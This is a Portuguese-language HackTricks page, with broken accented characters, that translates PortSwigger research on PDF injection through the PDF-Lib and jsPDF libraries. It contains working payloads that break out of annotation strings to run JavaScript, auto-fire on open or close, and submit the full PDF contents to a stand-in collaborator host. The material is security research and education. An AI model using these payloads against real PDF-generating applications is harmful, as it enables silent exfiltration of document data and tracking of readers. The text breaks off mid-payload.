<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Se a sua entrada est√° sendo refletida dentro de um arquivo PDF, voc√™ pode tentar injetar dados PDF para executar JavaScript ou roubar o conte√∫do do PDF.**

As seguintes informa√ß√µes foram retiradas de [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Desta vez, eu estava usando [PDFLib](https://pdf-lib.js.org). Dediquei algum tempo para usar a biblioteca para criar uma anota√ß√£o e ver se eu poderia injetar um par√™ntese de fechamento na URI da anota√ß√£o - e funcionou! O c√≥digo vulner√°vel de exemplo que usei para gerar o c√≥digo da anota√ß√£o foi:

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[C√≥digo completo:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

Como eu sabia que a inje√ß√£o foi bem-sucedida? O PDF renderizaria corretamente a menos que eu injetasse um par√™ntese de fechamento. Isso provou que o par√™ntese de fechamento estava quebrando o limite do texto e causando c√≥digo PDF inv√°lido. Quebrar o PDF foi bom, mas eu precisava garantir que eu pudesse executar JavaScript, √© claro. Eu olhei para o c√≥digo PDF renderizado e notei que a sa√≠da estava sendo codificada usando o filtro FlateDecode. Eu escrevi um pequeno script para desinflar o bloco e a sa√≠da da se√ß√£o de anota√ß√£o parecia assim:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Como voc√™ pode ver claramente, a string de inje√ß√£o est√° fechando o limite do texto com um par√™ntese de fechamento, o que deixa um par√™ntese de fechamento existente que faz com que o PDF seja renderizado incorretamente:

![Captura de tela mostrando um di√°logo de erro ao carregar o PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

√ìtimo, ent√£o eu poderia quebrar a renderiza√ß√£o do PDF, e agora? Eu precisava criar uma inje√ß√£o que chamasse algum JavaScript - o alert(1) da inje√ß√£o de PDF.

Assim como os vetores de XSS dependem do parsing do navegador, a explorabilidade da inje√ß√£o de PDF pode depender do renderizador de PDF. Eu decidi come√ßar pelo Acrobat porque pensei que os vetores seriam menos propensos a funcionar no Chrome. Duas coisas que notei: 1) Voc√™ poderia injetar a√ß√µes de anota√ß√£o adicionais e 2) se voc√™ reparar o par√™ntese de fechamento existente, ent√£o o PDF renderizaria. Ap√≥s algumas experimenta√ß√µes, eu criei uma carga √∫til agrad√°vel que injetou uma a√ß√£o de anota√ß√£o adicional, executou JavaScript e reparou o par√™ntese de fechamento:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

Primeiro eu saio do par√™ntese, depois saio do dicion√°rio usando >> antes de come√ßar um novo dicion√°rio de anota√ß√£o. O /S/JavaScript faz a anota√ß√£o baseada em JavaScript e o /JS √© onde o JavaScript √© armazenado. Dentro dos par√™nteses est√° nosso JavaScript real. Note que voc√™ n√£o precisa escapar os par√™nteses se eles estiverem balanceados. Finalmente, eu adiciono o tipo de anota√ß√£o, termino o dicion√°rio e reparo o par√™ntese de fechamento. Isso foi t√£o legal; eu poderia criar uma inje√ß√£o que executasse JavaScript, mas e da√≠, certo? Voc√™ pode executar JavaScript, mas voc√™ n√£o tem acesso ao DOM, ent√£o voc√™ n√£o pode ler cookies. Ent√£o James apareceu e sugeriu roubar o conte√∫do do PDF a partir da inje√ß√£o. Eu comecei a olhar maneiras de obter o conte√∫do de um PDF. No Acrobat, descobri que voc√™ pode usar JavaScript para enviar formul√°rios sem qualquer intera√ß√£o do usu√°rio! Olhando para a especifica√ß√£o da API JavaScript, foi bastante simples modificar a inje√ß√£o base e adicionar um pouco de JavaScript que enviaria todo o conte√∫do do c√≥digo PDF para um servidor externo em uma requisi√ß√£o POST:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

O alerta n√£o √© necess√°rio; eu apenas o adicionei para provar que a inje√ß√£o estava executando JavaScript.

Em seguida, apenas por divers√£o, eu olhei para roubar o conte√∫do do PDF sem usar JavaScript. Da especifica√ß√£o do PDF, descobri que voc√™ pode usar uma a√ß√£o chamada SubmitForm. Eu usei isso no passado quando constru√≠ um PDF para uma verifica√ß√£o de varredura no Burp Suite. Ele faz exatamente o que o nome implica. Ele tamb√©m tem uma entrada Flags no dicion√°rio para controlar o que √© enviado. A chave do dicion√°rio Flags aceita um √∫nico valor inteiro, mas cada configura√ß√£o individual √© controlada por um bit bin√°rio. Uma boa maneira de trabalhar com essas configura√ß√µes √© usando os novos literais bin√°rios em ES6. O literal bin√°rio deve ter 14 bits de comprimento porque h√° 14 flags no total. No exemplo a seguir, todas as configura√ß√µes est√£o desativadas:`0b00000000000000`

Para definir uma flag, voc√™ primeiro precisa olhar para a sua posi√ß√£o de bit (tabela 237 da [especifica√ß√£o do PDF](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000\_2008.pdf)). Neste caso, queremos definir a flag SubmitPDF. Como isso √© controlado pelo 9¬∫ bit, voc√™ s√≥ precisa contar 9 bits da direita:`0b00000100000000`

Se voc√™ avaliar isso com JavaScript, isso resulta no valor decimal 256. Em outras palavras, definir a entrada Flags para 256 habilitar√° a flag SubmitPDF, o que faz com que o conte√∫do do PDF seja enviado ao enviar o formul√°rio. Tudo o que precisamos fazer √© usar a inje√ß√£o base que criamos anteriormente e modific√°-la para chamar a a√ß√£o SubmitForm em vez de JavaScript:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

Em seguida, apliquei minha metodologia a outra biblioteca PDF - [jsPDF](https://parall.ax/products/jspdf) - e descobri que ela tamb√©m era vulner√°vel. Explorar esta biblioteca foi bastante divertido porque eles t√™m uma API que pode ser executada no navegador e permitir√° que voc√™ gere o PDF em tempo real enquanto digita. Notei que, como a biblioteca PDP-Lib, eles esqueceram de escapar par√™nteses dentro das URLs de anota√ß√£o. Aqui a propriedade url estava vulner√°vel:`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulner√°vel`

Ent√£o eu gerei um PDF usando sua API e injetei c√≥digo PDF na propriedade url:

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

Eu reduzi o vetor removendo as entradas de tipo do dicion√°rio e a entrada F desnecess√°ria. Depois, deixei um par√™ntese pendente que seria fechado pelo existente. Reduzir o tamanho da inje√ß√£o √© importante porque a aplica√ß√£o web que voc√™ est√° injetando pode permitir apenas uma quantidade limitada de caracteres.`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

Depois, descobri que era poss√≠vel reduzir ainda mais o vetor! O Acrobat permitiria uma entrada URI e uma entrada JavaScript dentro de uma √∫nica a√ß√£o de anota√ß√£o e executaria felizmente o JavaScript:`/)/S/JavaScript/JS(app.alert(1)`

Pesquisas adicionais revelaram que voc√™ tamb√©m pode injetar m√∫ltiplas anota√ß√µes. Isso significa que, em vez de apenas injetar uma a√ß√£o, voc√™ poderia sair da anota√ß√£o e definir suas pr√≥prias coordenadas de ret√¢ngulo para escolher qual se√ß√£o do documento seria clic√°vel. Usando essa t√©cnica, consegui fazer com que todo o documento fosse clic√°vel. `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Executando anota√ß√µes sem intera√ß√£o

At√© agora, os vetores que demonstrei requerem um clique para ativar a a√ß√£o da anota√ß√£o. Tipicamente, James fez a pergunta "Podemos executar automaticamente?". Eu olhei atrav√©s da especifica√ß√£o do PDF e notei algumas caracter√≠sticas interessantes das anota√ß√µes:

"As entradas **PV** e **PI** permitem uma distin√ß√£o entre p√°ginas que est√£o abertas e p√°ginas que s√£o vis√≠veis. A qualquer momento, apenas uma √∫nica p√°gina √© considerada aberta no aplicativo visualizador, enquanto mais de uma p√°gina pode ser vis√≠vel, dependendo do layout da p√°gina."

Podemos adicionar a entrada PV ao dicion√°rio e a anota√ß√£o ser√° disparada automaticamente no Acrobat! N√£o s√≥ isso, mas tamb√©m podemos executar uma carga √∫til automaticamente quando o documento PDF √© fechado usando a entrada PC. Um atacante poderia rastrear quando voc√™ abre o PDF e o fecha.

Aqui est√° como executar automaticamente a partir de uma anota√ß√£o:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

Quando voc√™ fecha o PDF, esta anota√ß√£o ser√° disparada:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

Eu falei muito sobre o Acrobat, mas e sobre o PDFium (leitor de PDF do Chrome)? O Chrome √© complicado; a superf√≠cie de ataque √© muito menor, pois seu suporte a JavaScript √© mais limitado do que o do Acrobat. A primeira coisa que notei foi que o JavaScript n√£o estava sendo executado em anota√ß√µes, ent√£o meus conceitos de prova n√£o estavam funcionando. Para fazer os vetores funcionarem no Chrome, eu precisava pelo menos executar JavaScript dentro das anota√ß√µes. Primeiro, por√©m, decidi tentar sobrescrever uma URL em uma anota√ß√£o. Isso foi bastante f√°cil. Eu poderia usar a inje√ß√£o base que criei antes e simplesmente injetar outra a√ß√£o com uma entrada URI que sobrescreveria a URL existente:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

Isso navegaria para portswigger.net quando clicado. Ent√£o eu continuei e tentei diferentes inje√ß√µes para chamar JavaScript, mas isso falharia todas as vezes. Eu pensei que era imposs√≠vel fazer. Eu dei um passo atr√°s e tentei construir manualmente um PDF inteiro que chamaria JavaScript a partir de um clique no Chrome sem uma inje√ß√£o. Ao usar um bot√£o AcroForm, o Chrome permitiria a execu√ß√£o de JavaScript, mas o problema era que ele exigia refer√™ncias a partes do PDF. Eu consegui criar uma inje√ß√£o que executaria JavaScript a partir de um clique no JSPDF:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

Como voc√™ pode ver, o vetor acima requer conhecimento da estrutura do PDF. \[ 3 0 R] refere-se a um objeto PDF espec√≠fico e se estiv√©ssemos fazendo um ataque cego de inje√ß√£o de PDF, n√£o saber√≠amos a estrutura dele. Ainda assim, a pr√≥xima etapa √© tentar uma submiss√£o de formul√°rio. Podemos usar a fun√ß√£o submitForm para isso, e como a anota√ß√£o requer um clique, o Chrome permitir√°:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

Isso funciona, mas √© confuso e requer conhecimento da estrutura do PDF. Podemos reduzi-lo muito e remover a depend√™ncia da estrutura do PDF:`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`\
`app.alert(1)`\
`)/Type/Action/F 4/DA
